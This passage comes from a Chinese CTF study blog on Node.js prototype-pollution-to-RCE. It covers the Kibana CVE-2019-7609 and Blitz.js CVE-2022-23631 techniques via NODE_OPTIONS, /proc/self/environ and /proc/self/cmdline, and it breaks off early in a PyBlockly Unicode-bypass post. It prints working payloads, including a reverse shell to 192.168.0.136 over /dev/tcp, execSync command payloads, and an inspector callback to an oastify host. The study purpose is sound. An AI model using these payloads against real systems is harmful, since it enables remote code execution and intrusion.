与之对应。<code>spawn(&#39;whoami&#39;)</code></p><ol><li>这里经过处理后已经不是一开始参数中的options了，具体源码还看不懂sad</li><li><em><strong>对于fork()有些许不同</strong></em></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">fork</span> = <span class="keyword">function</span>(<span class="params">modulePath <span class="comment">/*, args, options*/</span></span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">    options.<span class="property">execPath</span> = options.<span class="property">execPath</span> || process.<span class="property">execPath</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">spawn</span>(options.<span class="property">execPath</span>, args, options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>以下是normalizeSpawnArguments</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node早期版本</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalizeSpawnArguments</span>(<span class="params">file, args, options</span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">if</span> (options === <span class="literal">undefined</span>)</span><br><span class="line">    options = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">var</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line">  <span class="keyword">var</span> envPairs = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    envPairs.<span class="title function_">push</span>(key + <span class="string">&#x27;=&#x27;</span> + env[key]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">_convertCustomFds</span>(options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">file</span>: file,</span><br><span class="line">    <span class="attr">args</span>: args,</span><br><span class="line">    <span class="attr">options</span>: options,</span><br><span class="line">    <span class="attr">envPairs</span>: envPairs</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*node v18</span></span><br><span class="line"><span class="comment">  for (const key of envKeys) &#123;</span></span><br><span class="line"><span class="comment">    const value = env[key];</span></span><br><span class="line"><span class="comment">    if (value !== undefined) &#123;</span></span><br><span class="line"><span class="comment">        validateArgumentNullCheck(key, `options.env[&#x27;$&#123;key&#125;&#x27;]`);</span></span><br><span class="line"><span class="comment">        validateArgumentNullCheck(value, `options.env[&#x27;$&#123;key&#125;&#x27;]`);</span></span><br><span class="line"><span class="comment">        ArrayPrototypePush(envPairs, `$&#123;key&#125;=$&#123;value&#125;`);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="RCE-via-env"><a href="#RCE-via-env" class="headerlink" title="RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)"></a>RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)</h3><h4 id="深入理解-proc-self-environ"><a href="#深入理解-proc-self-environ" class="headerlink" title="深入理解&#x2F;proc&#x2F;self&#x2F;environ"></a>深入理解&#x2F;proc&#x2F;self&#x2F;environ</h4><ol><li><p>类似的敏感文件</p> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/environ 当前进程的环境变量</span><br><span class="line">/proc/self/cwd 当前进程运行的目录环境</span><br><span class="line">/proc/self/cmdline 文件查看当前进行进程执行命令</span><br><span class="line">/proc/[pid]/fd 当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</span><br><span class="line">/proc/net/fib_trie、/proc/net/arp、/proc/net/route 内网探测</span><br><span class="line">/sys/class/net/eth0/address mac地址</span><br></pre></td></tr></table></figure></li><li><p><em><strong>进程</strong></em>: 进程（Process）是计算机操作系统中一个重要的概念，它是程序的一次执行过程，是系统进行资源分配和调度的基本单位。每个进程都有一个唯一的标识符，称为进程ID（PID）。进程不仅包含程序的指令集，还包括程序执行时所需的资源</p><ol><li>每个进程都有自己独立的地址空间，一个进程的内存与其他进程的内存是隔离的 –&gt; 子进程是独立的，有自己的内存空间和资源。父进程的崩溃不会直接影响子进程，反之亦然</li></ol></li><li><p><em><strong>每个进程共享一个&#x2F;proc&#x2F;self&#x2F;environ?</strong></em></p><ol><li>不同进程的 &#x2F;proc&#x2F;self&#x2F;environ 文件是不同的！但是每个独立的进程并不会拥有自己独立的文件系统。相反，所有进程共享同一个全局文件系统</li><li>这是通过 Linux 内核的命名空间（namespaces）和虚拟文件系统（VFS）机制实现的。尽管所有进程共享同一个全局文件系统，但每个进程的 &#x2F;proc&#x2F;self&#x2F;environ 文件实际上是一个<strong>虚拟文件</strong>(符号链接)，由内核动态生成，反映了该进程的环境变量</li></ol></li></ol><h4 id="payloads和核心思想"><a href="#payloads和核心思想" class="headerlink" title="payloads和核心思想"></a>payloads和核心思想</h4><blockquote><p>注意下最后payload两种形式都可以</p></blockquote><ol><li>REF<ol><li>写的很是清晰易懂<a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">原文</a> –&gt; 部分内容写在上面了</li><li><a href="https://cloud.tencent.com/developer/article/1533939">这篇解析也挺好的，跟着思考</a></li></ol></li><li>要求<ol><li>需要有可以操控的文件如这里的&#x2F;proc&#x2F;self&#x2F;environ</li><li>&#x2F;proc&#x2F;self&#x2F;environ中注入的环境变量应该位于首行</li></ol></li><li>提炼一下并思考一下我的问题<ol><li><em><strong>这里的核心思想</strong></em>是通过env变量的原型链污染来实现控制新进程的环境变量，并通过特殊的参数NODE_OPTIONS“包含js文件”并执行代码</li><li><em><strong>Q DONE: NODE_OPTIONS是如何发挥作用的呢？</strong></em><ol><li>A: 这里也是通过环境变量进行设置的，其实可以从<a href="https://nodejs.org/api/cli.html#node_optionsoptions">官方文档</a>推断出来的，这里允许的<code>NODE_OPTIONS=&#39;--require &quot;./file.js&quot;&#39; node</code>实质上是添加了环境变量，分开来使用<code>export NODE_OPTIONS</code>也是可以的 –&gt; 也可以<strong>问gpt bro</strong></li></ol></li><li>这里通过在env中设置环境新的环境变量<code>AAA=console.log(123)//</code>来做poc，js文件时将后续进行注释</li><li>Q DONE: 如何使得&#x2F;proc&#x2F;self&#x2F;environ文件的开头是就是我们想要执行的语句？<ol><li>A: 通过字典排序？注意到&#x3D;表达式本身就是一个合法的js语言，这里其实不一定(因为一开始的for in读取的是键，在js对象中的键大部分按照插入顺序来的)</li></ol></li><li>Q DONE: 这里不是js文件也可以执行js代码吗？<ol><li>A: 难道和php一样？笑死，给忘记了，在node中require()本来就不用加上文件尾部，默认为js解析 –&gt; <strong>所以可能有和php一样的文件包含漏洞</strong></li></ol></li></ol></li><li>payload<ol><li><p>Notice</p><ol><li>由于js不是编译型语言(包括nodejs)，所以注释其实不是必须的，只要有执行到命令那一行就好</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bash</span></span><br><span class="line"><span class="variable constant_">NODE_OPTIONS</span>=<span class="string">&#x27;--require file&#x27;</span> node</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>());odivnafadnvoa</span><br><span class="line">  <span class="comment">// 会在运行同步命令后才报错</span></span><br></pre></td></tr></table></figure></li><li><p>final paylaod</p><ol><li><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#39;).props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></li><li><strong>NODE_OPTIONS也可以不写在里面.env里面，可以确保要执行的命令在第一行，HackTricks中说的(其实也还好，可能是字典顺序&#x2F;插入顺序等，只有一个当然更好)</strong> –&gt; 这就是原型链污染的魅力</li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">USERINPUT</span> = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/environ&quot;, &quot;env&quot;: &#123; &quot;EVIL&quot;:&quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce\\\&quot;).toString())//&quot;&#125;&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如何理解</span></span><br><span class="line">a=&#123;&#125;  <span class="comment">// [[Pro..]]==Object</span></span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>=&#123;&#125;</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">AAA</span>=<span class="string">&quot;console.log(123)&quot;</span></span><br><span class="line">a</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span>=<span class="string">&#x27;--require hello&#x27;</span></span><br><span class="line">a</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">NODE_OPTIONS</span>  <span class="comment">// 输出--require hello</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(a.<span class="property">__proto__</span>.<span class="property">env</span>)  <span class="comment">// 输出[&#x27;AAA&#x27;, &#x27;NODE_OPTIONS&#x27;]</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="RCE-via-cmdline"><a href="#RCE-via-cmdline" class="headerlink" title="RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough"></a>RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough</h3><h4 id="分析一下源码"><a href="#分析一下源码" class="headerlink" title="分析一下源码"></a>分析一下源码</h4><ol><li><p>ref</p><ol><li><a href="https://www.sonarsource.com/blog/blitzjs-prototype-pollution/">cve-2022-23631</a>但是这篇也只是介绍</li></ol></li><li><p>相关信息：已在 superjson 1.8.1 和 Blitz.js 0.45.3 中修复</p></li><li><p><em><strong>从源码看漏洞原理</strong></em></p><ol><li><a href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L429">github argv0与shell源码</a>，这里适用原型污染会使得有shell(L456)<a href="https://po6ix.github.io/Abusing-Environment-Variables/">这篇里也有说明</a>和argv0(L477)并会被识别 -&gt; <strong>这里其实也不需要很了解，只要了解有传入和没有传入的差别就好，通过原型链勿扰构造有传入的情况</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最终执行belike???这里的在原文章 https://c1oudfl0w0.github.io/blog/2024/10/11/PP2RCE/#via-env-vars-cmdline 中实验也可以不改shell，我感觉的具体原因应该看看 深入理解shell这里</span></span><br><span class="line"><span class="title function_">execve</span>(<span class="string">&quot;/proc/self/exe&quot;</span>, [<span class="string">&quot;console.log(&#x27;pwned!&#x27;);//&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;node …&quot;</span>], &#123; <span class="attr">NODE_OPTIONS</span>: <span class="string">&quot;--require /proc/self/cmdline&quot;</span> &#125;)</span><br></pre></td></tr></table></figure></li></ol><h4 id="深入理解argv0"><a href="#深入理解argv0" class="headerlink" title="深入理解argv0"></a>深入理解argv0</h4><blockquote><p>怎么感觉node的官方文档写得很简略呢，还是要实验和ai一下</p></blockquote><ol><li>解析一下argv数组<ol><li>argv数组是在可执行文件命令已经解析并确定要执行的可执行文件之后传递给该可执行文件的，<strong>修改其中的argv[0]并不会影响到确定要执行的可执行文件</strong>，但是但是<strong>修改argv[1]等元素可以显著影响程序的行为，因为在具体实现中会作为配置项</strong></li><li>但argv[0]还是会有影响：某些程序的具体实现会根据 argv[0] 的值来决定执行不同的功能</li></ol></li><li>Q: child_process spawn下argv0的作用？<ol><li>注意到官方文档中的一句话: Node.js 在启动时会用 process.execPath 覆盖 argv[0]，因此 Node.js 子进程中的 process.argv[0] 不会匹配从父进程传给 spawn 的 argv0 参数。改为使用 process.argv0 属性检索它 –&gt; <strong>argv[0]和argv是不同的</strong><ol><li><a href="https://www.geeksforgeeks.org/node-js-process-execpath-property/">node process.execPath 官方文档</a>，说明该属性返回当前 Node.js 可执行文件的绝对路径 –&gt; <strong>by the way在fork中可以调整(可以获取看看上面的源码)</strong></li></ol></li><li>在nodejs中<ol><li><p>process.argv[0]：指向 Node.js 可执行文件的路径。这个值会被 process.execPath 覆盖，因此总是显示 Node.js 可执行文件的路径。</p></li><li><p>process.argv0：保留了从父进程传递给子进程的 argv[0] 值。这个值不会被覆盖，因此可以用来获取原始的 argv[0] 值 –&gt; <strong>spawn方法下会被传入到&#x2F;proc&#x2F;self&#x2F;cmdline中</strong>，测试脚本如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// parent.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> scriptPath = <span class="string">&#x27;./child.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 &quot;customNode&quot; 的名义调用</span></span><br><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [scriptPath], &#123; <span class="attr">argv0</span>: <span class="string">&#x27;customNode&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">child.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line">child.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line">child.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`子进程退出，退出码 <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// child.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;process.argv:&#x27;</span>, process.<span class="property">argv</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;process.argv0:&#x27;</span>, process.<span class="property">argv0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 /proc/self/cmdline</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cmdline = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/proc/self/cmdline&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">split</span>(<span class="string">&#x27;\0&#x27;</span>).<span class="title function_">filter</span>(<span class="title class_">Boolean</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;cmdline:&#x27;</span>, cmdline);</span><br><span class="line"></span><br><span class="line"><span class="comment">// bash and res</span></span><br><span class="line">node parent.<span class="property">js</span></span><br><span class="line"><span class="attr">stdout</span>: process.<span class="property">argv</span>: [</span><br><span class="line">  <span class="string">&#x27;/usr/bin/node&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;/home/kc1zs4/Code/CodeVscode/Notes/WLabs/1/child.js&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="attr">stdout</span>: process.<span class="property">argv0</span>: customNode</span><br><span class="line"></span><br><span class="line"><span class="attr">stdout</span>: <span class="attr">cmdline</span>: [ <span class="string">&#x27;customNode&#x27;</span>, <span class="string">&#x27;./child.js&#x27;</span> ]</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h4 id="深入理解shell"><a href="#深入理解shell" class="headerlink" title="深入理解shell"></a>深入理解shell</h4><ol><li><p>Q: shell属性如何和argv0属性进行协作？</p><ol><li>A: <a href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L429">源码部分</a>见下，可知argv0并不会影响传入shell的命令，只是会影响传入子进程的argv0，同时进行测试可以知道分析是正确的，<em><strong>同时在此处shell对我们想要的命令的执行几乎是没有影响的</strong></em></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(<span class="string">&#x27;ls&#x27;</span>, [], &#123; <span class="attr">argv0</span>: <span class="string">&#x27;pwd&#x27;</span>, <span class="attr">shell</span>: <span class="string">&#x27;/bin/sh&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">child.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line">child.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line">child.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`子进程退出，退出码 <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src</span></span><br><span class="line"><span class="keyword">if</span> (options.<span class="property">shell</span>) &#123;</span><br><span class="line">   <span class="keyword">const</span> command = [file].<span class="title function_">concat</span>(args).<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;win32&#x27;</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">       file = options.<span class="property">shell</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       file = process.<span class="property">env</span>.<span class="property">comspec</span> || <span class="string">&#x27;cmd.exe&#x27;</span>;</span><br><span class="line">     args = [<span class="string">&#x27;/d&#x27;</span>, <span class="string">&#x27;/s&#x27;</span>, <span class="string">&#x27;/c&#x27;</span>, <span class="string">`&quot;<span class="subst">$&#123;command&#125;</span>&quot;`</span>];</span><br><span class="line">     options.<span class="property">windowsVerbatimArguments</span> = <span class="literal">true</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">       file = options.<span class="property">shell</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;android&#x27;</span>)</span><br><span class="line">       file = <span class="string">&#x27;/system/bin/sh&#x27;</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       file = <span class="string">&#x27;/bin/sh&#x27;</span>;</span><br><span class="line">     args = [<span class="string">&#x27;-c&#x27;</span>, command];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">argv0</span> === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">  args.<span class="title function_">unshift</span>(options.<span class="property">argv0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  args.<span class="title function_">unshift</span>(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line"><span class="keyword">var</span> envPairs = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">  envPairs.<span class="title function_">push</span>(key + <span class="string">&#x27;=&#x27;</span> + env[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="核心思想和payloads"><a href="#核心思想和payloads" class="headerlink" title="核心思想和payloads"></a>核心思想和payloads</h4><blockquote><p>这里是根据自己理解的，忽略了一些关于shell参数的</p></blockquote><ol><li><em><strong>这里其实也是一样的绕过思路</strong></em>，通过NODE_OPTIONS了指定require的文件来执行，这里由于无法控制<code>/proc/self/environ</code>从而转向<code>/proc/self/cmdline</code><ol><li><p>再点一下<code>require()</code>函数: 把读取到的内容放到一个自执行函数中执行(所以可以用来执行命令)，返回module.exports需要导出的内容 -&gt; 为什么官方文档没有找到？纳尼</p></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/cmdline&quot;, &quot;argv0&quot;: &quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce2\\\&quot;).toString())//&quot;&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="RCE-via-Inspector"><a href="#RCE-via-Inspector" class="headerlink" title="RCE via Inspector"></a>RCE via Inspector</h3><ol><li><p>node运行时允许添加<code>--inspect=host:port</code>格式来设置调试服务器监听的主机地址，<a href="https://www.nodeapp.cn/cli.html#cli_inspect_host_port">详见文档</a></p><ol><li>需要注意防火墙的问题</li></ol></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;argv0&quot;</span>:<span class="string">&quot;node&quot;</span>,</span><br><span class="line">      <span class="string">&quot;shell&quot;</span>:<span class="string">&quot;node&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NODE_OPTIONS&quot;</span>:<span class="string">&quot;--inspect=id\&quot;\&quot;.oastify\&quot;\&quot;.com&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实际应用????</p></li></ol><h3 id="Defence-Patch"><a href="#Defence-Patch" class="headerlink" title="Defence Patch"></a>Defence Patch</h3><ol><li>由于js原型的特殊性质，涉及到判断的属性最好都提前预设值，否则可以借助原型链污染进行设置 –&gt; 这就是env, shell, argv0可以进行污染的一个原因，因为原型无法覆盖上层值</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyBlockly_强网24</title>
      <link href="/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[<blockquote><p>截至24&#x2F;11&#x2F;3 21:25 还是没有尝试出来，等以后有正规题解再来，这里先不看了，先看看提权吧<br>这道题感觉初见还是蛮有东西的，对我这个菜鸡是一道很值得学习的题目</p></blockquote><hr><h2 id="思想here"><a href="#思想here" class="headerlink" title="思想here"></a>思想here</h2><blockquote><p><em><strong>培养一点重要的思想</strong></em><br>1.思维是肯定是找注入点，比如这里的<br>2.多多本地试试，输入没有想要的效果一定要检查，<strong>强推本地跑一下</strong><br>3.涉及编码推荐适用python进行尝试，可以显示(bp这里不行)还可以用编码表示</p></blockquote><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><a href="https://shad0wwalker.com/posts/2698268298.html">Unicode规范化Bypass-CTF特殊题型</a>，后面看到补的内容</li></ol><h2 id="分析与尝试"><a href="#分析与尝试" class="headerlink" title="分析与尝试"></a>分析与尝试</h2><ol><li><p>unicode绕过，呜呜呜，只构造出来poc，可以实现代码执行，进一步可以绕过</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">＇﹔<span class="built_in">print</span>⁽＇hello＇⁾﹔＇</span><br></pre></td></tr></table></figure></li><li><p>重写len()函数，读取文件，到这一步就卡住了 –&gt; <em><strong>编码的还是要在本地尝试一下</strong></em>，这里出现了转换后消失的情况，可以一个一个试</p><ol><li>WTF? –&gt; <em><strong>真相大白了，这里没有导入os模块调用不了啊，记错了wc，怪怪的可能是逻辑理解错了</strong></em><img src="/pic/PyBlockly_%E5%BC%BA%E7%BD%9124/len%E5%8F%91%E6%8C%A5%E4%BA%86%E4%BD%9C%E7%94%A8.png" alt="不懂为什么没有回显，蒙蔽了这是，绕过应该是成功"></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 